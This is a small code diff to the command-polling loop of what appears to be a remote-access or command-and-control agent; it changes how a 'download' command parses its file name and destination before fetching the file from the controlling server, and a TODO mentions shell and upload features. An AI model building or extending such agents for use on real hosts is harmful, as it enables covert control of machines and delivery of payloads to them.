@@ -102,8 +102,8 @@ def fetchCommand(ip):
         # TODO: Add upload/download/shell related functionality of the agent here 
         if "download" == command.split(' ')[0]:
             try:
-                filename = json_data['command'][1]
-                destination_path = json_data['command'][2]
+                filename = command.split(' ')[1]
+                destination_path = command.split(' ')[2]
 
                 download_url = URL + '/download/' + filename
                 myFile = requests.get(download_url)
